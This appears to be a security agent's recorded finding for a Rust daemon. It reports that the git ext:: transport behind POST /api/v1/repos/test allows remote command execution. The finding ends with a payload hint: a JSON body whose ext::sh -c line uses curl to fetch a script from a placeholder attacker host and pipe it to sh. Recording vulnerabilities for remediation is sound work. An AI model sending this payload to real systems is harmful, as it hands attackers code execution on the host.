record_exploration_finding
{
  "path": "crates/nyx-agent-api/src/router.rs",
  "line": 799,
  "cap": "OS_COMMAND",
  "endpoint": "POST /api/v1/repos/test (git transport=ext::)",
  "rationale": "Same handler as the SSRF row, distinct sink. `git` supports the `ext::<cmd>` transport, which executes `<cmd>` as a shell command and reads/writes pack data on its stdio. ls-remote with `url = ext::sh -c '<payload>'` triggers `git` to spawn the embedded command on the daemon host with the daemon's privileges, even though the wrapper passes `GIT_TERMINAL_PROMPT=0` and a scrubbed config — the ext:: transport is part of `git` itself, not a config-controlled helper. Net effect: any authenticated caller of /api/v1/repos/test gets unauthenticated-equivalent RCE on the daemon host (the request body is plain JSON, no second-factor). The empty-string guard at line 752 does not look at the scheme. CVE-2017-1000117-class pattern, just lifted into the daemon's surface. Hard to spot statically because the sink is a string arg to `git` that *looks* benign.",
  "suggested_payload_hint": "POST /api/v1/repos/test {\"source_kind\":\"git\",\"source_url_or_path\":\"ext::sh -c 'curl http://attacker/x|sh >&2'\"} — observe attacker callback while TestRepoResponse.ok=false."
}

